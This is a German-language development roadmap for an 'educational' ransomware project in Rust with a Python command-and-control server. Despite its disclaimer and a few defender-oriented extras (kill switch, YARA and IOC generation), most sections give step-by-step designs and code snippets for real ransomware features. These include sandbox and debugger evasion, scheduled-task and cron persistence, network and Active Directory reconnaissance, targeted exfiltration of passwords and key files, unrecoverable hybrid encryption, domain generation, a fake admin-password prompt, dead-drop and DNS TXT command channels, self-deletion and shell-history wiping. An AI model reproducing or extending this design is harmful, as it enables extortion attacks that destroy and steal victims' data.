# Roadmap: Erweiterte Features für Edu-Ransomware

> **⚠ Wichtiger Hinweis:** Dieses Dokument dient ausschließlich Bildungszwecken im Rahmen einer genehmigten Simulation. Die Implementierung dieser Features verwandelt die Software in potenziell gefährliche Malware. Führen Sie Tests **ausschließlich** in isolierten Umgebungen (Sandboxes, VMs ohne Internetzugriff) durch.

---

## 1. Erweiterte Evasion-Techniken 

### Ziel:
Die Malware soll erkennen, ob sie analysiert wird, und sich unauffällig verhalten oder beenden.

### Implementierungsschritte:

#### A. Sandbox-Detection (Maus-Tracking & Sleep-Patching)
Viele Sandboxes simulieren keine Mausbewegungen oder überspringen `sleep()` Befehle.

*   **Rust Crate:** `device_query` (für Maus) oder native OS-APIs.
*   **Logik:**
    1.  Mausposition abfragen.
    2.  `sleep(5000)` (5 Sekunden warten).
    3.  Mausposition erneut abfragen.
    4.  Wenn Position identisch UND Zeitdifferenz < 4.9 Sekunden (Time-Warping): **Exit**.


#### B. Prozess-Checks (Anti-Analysis)
Prüfen, ob Tools wie Wireshark oder Task Manager laufen.

*   **Rust Crate:** `sysinfo` (bereits im Projekt).
*   **Code-Snippet:**
    ```rust
    let dangerous_processes = ["wireshark", "procmon", "x64dbg", "fiddler"];
    for proc in sys.processes().values() {
        if dangerous_processes.contains(&proc.name().to_lowercase().as_str()) {
            std::process::exit(0);
        }
    }
    ```

---

## 2. Advanced Persistence Mechanismen 

### Ziel:
Überleben eines Neustarts auch ohne Admin-Rechte oder Registry-Zugriff.

### Implementierungsschritte:

#### A. Windows: Scheduled Tasks
Robuster als Registry-Keys und oft übersehen.

*   **Befehl:** Nutzung von `std::process::Command` um `schtasks.exe` aufzurufen.
*   **Payload:**
    ```rust
    Command::new("schtasks")
        .args(&["/create", "/sc", "onlogon", "/tn", "WindowsUpdateHelper", "/tr", "PFAD_ZUR_EXE"])
        .output();
    ```

#### B. Linux: Cron Jobs
Der Klassiker unter Linux.

*   **Logik:**
    1.  Aktuelle Crontab lesen: `crontab -l`.
    2.  Neue Zeile anhängen: `@reboot /home/user/.hidden/malware_agent`.
    3.  Zurückschreiben: `crontab -`.

---

## 3. Lateral Movement & Netzwerk-Features

### Ziel:
Simulieren der Ausbreitung im lokalen Netzwerk (Wurm-Verhalten).

### Implementierungsschritte:

#### A. Network Discovery (Ping Sweep)
Finden anderer aktiver Hosts im Subnetz.

*   **Rust:** Eigene Logik mit `TcpStream::connect_timeout`.
*   **Ablauf:**
    1.  Eigene IP ermitteln (z.B. `192.168.1.10`).
    2.  Schleife über `192.168.1.1` bis `192.168.1.254`.
    3.  Versuch, Port 445 (SMB) oder 22 (SSH) mit kurzem Timeout (100ms) zu erreichen.
    4.  Ergebnis an C2 melden: `DISCOVERY: Found Host 192.168.1.55`.

---

## 4. Verbesserte Exfiltration

### Ziel:
Gezielter Diebstahl wertvoller Informationen vor der Verschlüsselung.

### Implementierungsschritte:

#### A. Datei-Typen-Priorisierung
Nicht alles blind exfiltrieren, sondern nach Wert filtern.

*   **Logik:**
    In der `walkdir` Schleife eine Prioritätsliste prüfen:
    ```rust
    let high_value = ["password", "kredit", "iban", "secret", ".kdbx", ".pem"];
    if high_value.iter().any(|&s| filename.contains(s)) {
        network::exfil_file(path); // Sofort hochladen!
    }
    ```

#### B. Screenshot-Funktion
Dem Angreifer zeigen, was das Opfer sieht.

*   **Rust Crate:** `screenshots`.
*   **Integration:**
    Neuer C2-Befehl `screenshot`. Bei Empfang Screenshot machen, als PNG im Speicher halten, Base64 codieren und als `EXFIL_DATA:screen.png:<base64>` senden.

---

## 5. Verschlüsselungs-Verbesserungen

### Ziel:
Erhöhung der Geschwindigkeit und Sicherheit der Kryptographie.

### Implementierungsschritte:

#### A. Intermittierende Verschlüsselung (Speed)
Verschlüsselt nur jeden n-ten Block einer Datei. Macht die Datei unbrauchbar, ist aber extrem schnell bei großen Dateien (Videos, Datenbanken).

*   **Logik in `crypto.rs`:**
    Anstatt `reader.read()` linear zu machen:
    1.  1MB lesen & verschlüsseln & schreiben.
    2.  1MB überspringen (Cursor im Writer und Reader weiterbewegen).
    3.  Wiederholen.

#### B. Hybrid Encryption (Sicherheit)
Der AES-Key liegt aktuell auf der Disk (`rescue.key`). Besser:

1.  **C2:** Generiert RSA-Keypair. Sendet Public Key an Agent.
2.  **Agent:** Generiert AES-Key. Verschlüsselt diesen mit dem RSA Public Key.
3.  **Agent:** Sendet den verschlüsselten Key an C2 und löscht ihn aus dem RAM.
4.  **Resultat:** Key ist auf dem Opfer-PC nicht wiederherstellbar.

---

## 6. Kommunikations-Verbesserungen

### Ziel:
Vermeidung von Blockaden durch statische IPs/Domains.

### Implementierungsschritte:

#### A. Domain Generation Algorithm (DGA)
Wenn die C2-Adresse offline ist, generiert der Agent selbstständig neue Adressen.

*   **Logik:**
    ```rust
    fn generate_domain(date: Date) -> String {
        let seed = date.to_string(); // z.B. "2025-05-20"
        let hash = md5(seed);
        format!("update-{}.com", &hash[0..8])
    }
    ```
    Der C2-Server muss denselben Algorithmus nutzen und die Domain registrieren (oder im DNS simulieren).

---

## 7. Mehr Social Engineering Features

### Ziel:
Den Nutzer zur Interaktion zwingen (Rechteerweiterung).

### Implementierungsschritte:

#### A. Fake Error Messages
Vortäuschen eines Systemfehlers, um Administrator-Rechte zu erschleichen (UAC Bypass Simulation).

*   **Rust Crate:** `native-windows-gui` oder simpler `msgbox`.
*   **Ablauf:**
    1.  Programm startet.
    2.  Zeigt Popup: "Systemkomponente veraltet. Bitte Administrator-Passwort eingeben, um fortzufahren."
    3.  Startet sich selbst mit `runas` (Windows) neu.

---

## 8. Stealth & Anti-Forensik 

### Ziel:
Spuren verwischen.

### Implementierungsschritte:

#### A. Self-Deletion (Melt)
Die Malware löscht sich nach der Ausführung selbst.

*   **Windows:** Batch-Trick. Die Malware startet eine `.bat` Datei:
    ```batch
    ping 127.0.0.1 -n 3 > nul
    del payload.exe
    del %0
    ```
*   **Linux:** Einfaches `std::fs::remove_file(std::env::current_exe()?)`. Unter Linux können laufende Binaries gelöscht werden.

---

## 9. Advanced C2-Server Features

### Ziel:
Bessere Übersicht für den Angreifer.

### Implementierungsschritte:

#### A. SQLite Datenbank
Statt Logs in der Konsole zu haben, speichern wir Bots in einer Datenbank.

*   **Python:** `import sqlite3`.
*   **Schema:** `table bots (id, ip, os, first_seen, last_seen, status)`.
*   **Vorteil:** Du kannst Befehle wie `list active` oder `filter windows` bauen.

---

## 10. Demonstrative Features

### Ziel:
Maximale Wirkung bei der Präsentation auf der Leinwand.

### Implementierungsschritte:

#### A. Der "Ransomware Screen" (HTML/CSS)
Das aktuelle `README_DECRYPT.html` verbessern.

*   **Inhalt:**
    *   JavaScript Countdown (48:00:00), der runterzählt.
    *   Farbwechsel (Rot blinkend).
    *   Fake-Chat-Fenster "Support".
*   **Integration:** In `extortion.rs` das HTML-Template entsprechend erweitern.

---

## 11. Selbstschutz-Mechanismen️

### Ziel:
Verhindern, dass die Malware zweimal startet.

### Implementierungsschritte:

#### A. Mutex / Singleton
*   **Rust Crate:** `named_lock`.
*   **Code:**
    ```rust
    use named_lock::NamedLock;
    let lock = NamedLock::create("MY_RANSOMWARE_MUTEX").unwrap();
    if lock.try_lock().is_err() {
        // Läuft bereits!
        std::process::exit(0);
    }
    ```
---

## 12. Compliance & Sicherheits-Features 

### Ziel:
Verhindern, dass die Malware ausbricht ("Zoo-Virus").

### Implementierungsschritte:

#### A. Der Kill-Switch
Bevor irgendetwas Böses passiert, prüft die Malware eine Bedingung.

*   **Logik:**
    HTTP GET auf `http://meine-sichere-domain.de/killswitch.txt`.
    *   Inhalt "STOP": Malware beendet sich sofort und löscht sich.
    *   Inhalt "RUN" (oder 404): Malware läuft.

#### B. Geo-Fencing
Nur IPs aus dem lokalen Labor-Netz zulassen.

*   **Code:**
    Eigene IP prüfen. Wenn sie nicht mit `192.168.` oder `10.` beginnt, sofort beenden. Das schützt davor, falls die Datei versehentlich ins Internet gelangt.


## 13. Enterprise & Active Directory Reconnaissance 

### Ziel:
Simulieren, wie Ransomware in Firmennetzwerken Ziele priorisiert (Domain Controller, Backup-Server).

### Implementierungsschritte:

#### A. LDAP Enumeration (Ohne Admin-Rechte)
Jeder Domain-User kann das AD lesen.

*   **Rust Crate:** `ldap3`.
*   **Logik:**
    1.  Verbindung zum Domain Controller (DC) via LDAP.
    2.  Query nach Gruppen wie "Domain Admins", "Backup Operators".
    3.  Liste der Computer im Netzwerk (`objectClass=computer`) holen.
    4.  Ergebnis an C2 senden (`RECON_DATA:AD_STRUCTURE:...`).

#### B. SMB Share Enumeration
Finden von Netzlaufwerken (das Hauptziel für Datenverschlüsselung in Firmen).

*   **Code:** Iteration über UNC-Pfade (`\\Server\Share`).
*   **Feature:** Automatisches Mounten gefundener Shares, um sie zu verschlüsseln.

---

## 14. Advanced Obfuscation & Steganography 

### Ziel:
Payloads verstecken, sodass sie wie harmlose Daten aussehen (Bypass von statischen Scannern/Firewalls).

### Implementierungsschritte:

#### A. Payload in Bildern verstecken (Steganographie)
Der Agent lädt ein harmloses `.png` (z.B. ein Meme) herunter, extrahiert daraus aber Konfigurationsdaten oder weiteren Code.

*   **Tech:** Least Significant Bit (LSB) Encoding.
*   **Ablauf:**
    1.  C2 hostet `funny_cat.png`. In den letzten Bits der Pixeldaten steckt die IP-Adresse des echten C2-Servers.
    2.  Agent lädt Bild, decodiert die IP, verbindet sich.
    3.  **Vorteil:** Netzwerkverkehr sieht aus wie harmloses Browsen.

#### B. Polyglot Files
Dateien, die gleichzeitig zwei Formate sind.

*   **Idee:** Eine Datei erstellen, die ein valides **PDF** (Rechnung) ist, aber gleichzeitig ein valides **ZIP**-Archiv, das die Malware enthält.
*   **Umsetzung:** PDF-Header am Anfang, ZIP-Struktur am Ende der Datei anhängen.

---

## 15. Resilience & Dead Drop Resolvers 

### Ziel:
Die C2-Infrastruktur unzerstörbar machen ("Uncensorable C2").

### Implementierungsschritte:

#### A. Social Media als C2 (Dead Drops)
Statt direkt eine IP zu kontaktieren, liest die Malware Profile auf legitimen Seiten.

*   **Szenario:**
    1.  Angreifer postet einen Kommentar auf einem spezifischen Instagram-Post oder YouTube-Video: *"Great video! #a1b2c3d4"*
    2.  Malware prüft diesen Post regelmäßig.
    3.  Der Hash `#a1b2c3d4` wird decodiert zur aktuellen C2-IP.
*   **Vorteil:** Firewalls blockieren YouTube/Instagram fast nie.

#### B. DNS TXT Records
Kommandos über DNS empfangen.

*   **Ablauf:**
    1.  Agent fragt DNS ab: `dig txt befehl.meine-malware-domain.com`.
    2.  Antwort (TXT Record): `exec_download_update`.
    3.  **Vorteil:** DNS-Traffic wird selten blockiert.

---

## 16. Purple Team Features (Der "Edu" Faktor) 

### Ziel:
Das Repo zur perfekten Lernressource für **Verteidiger (Blue Teams)** machen. Das unterscheidet "Skript-Kiddie-Malware" von "Educational Research".

### Implementierungsschritte:

#### A. YARA Rule Generator
Ein Skript, das automatisch eine YARA-Regel erstellt, um die *gerade kompilierte* Malware zu erkennen.

*   **Bash Skript:** `generate_yara.sh`
*   **Funktion:** Extrahiert Strings aus der Binary und baut eine `.yar` Datei.
*   **Lerneffekt:** Zeigt, wie AV-Scanner Signaturen erstellen.

#### B. IOC Extractor (Indicators of Compromise)
Die Malware schreibt beim Beenden eine Datei `report_iocs.json`.

*   **Inhalt:**
    *   Welche Dateien wurden angefasst?
    *   Welche Registry-Keys wurden erstellt?
    *   Zu welcher IP wurde verbunden?
*   **Nutzen:** Perfekt für Forensik-Training. Studenten müssen die Malware analysieren und am Ende ihren Bericht mit diesem "Lösungsbuch" vergleichen.

#### C. "Safe Mode" Watermark
Jede verschlüsselte Datei bekommt einen Header oder Footer `"ENCRYPTED_BY_EDU_PROJECT"`.

*   **Zweck:** Verhindert Verwechslung mit echtem Angriff und ermöglicht triviale Erkennung durch Hex-Editoren.

---

## 17. Linux-Spezifische Erweiterungen 

### Ziel:
Linux-Server sind das Rückgrat des Internets und ein Hauptziel für Ransomware (z.B. ESXi-Angriffe).

### Implementierungsschritte:

#### A. `motd` Hijacking (Message of the Day)
Wenn sich ein Admin per SSH einloggt, sieht er die Lösegeldforderung direkt im Terminal.

*   **Befehl:** Überschreiben von `/etc/motd` oder Erstellen von `/etc/update-motd.d/99-ransomware`.

#### B. Shell History Wiping (Anti-Forensik)
Löschen der Spuren im Terminal.

*   **Rust:**
    ```rust
    std::fs::remove_file("~/.bash_history");
    std::fs::remove_file("~/.zshrc_history");
    // Symlink auf /dev/null setzen, damit nichts mehr geloggt wird
    std::os::unix::fs::symlink("/dev/null", "~/.bash_history");
    ```

---

## 18. Dokumentation & Professionalisierung 

### Ziel:
Das Repo soll aussehen wie ein seriöses Forschungsprojekt.

### To-Dos für das Repo:

1.  **Architecture Diagrams (Mermaid.js):** Visuelle Darstellung des C2-Flows direkt in der `README.md`.
2.  **Mitre ATT&CK Mapping:** Eine Tabelle, die jedes Feature (z.B. "Registry Persistence") der entsprechenden MITRE-Technik-ID (z.B. T1547.001) zuordnet. Das lieben Dozenten und Security-Profis.
3.  **Video Demo:** Ein GIF oder MP4 im Repo, das den gesamten Ablauf in 30 Sekunden zeigt.
4.  **DevContainer Support:** Eine `.devcontainer` Konfiguration, damit User das Projekt mit einem Klick in VS Code (Docker) öffnen und bauen können, ohne Rust/Python installieren zu müssen.
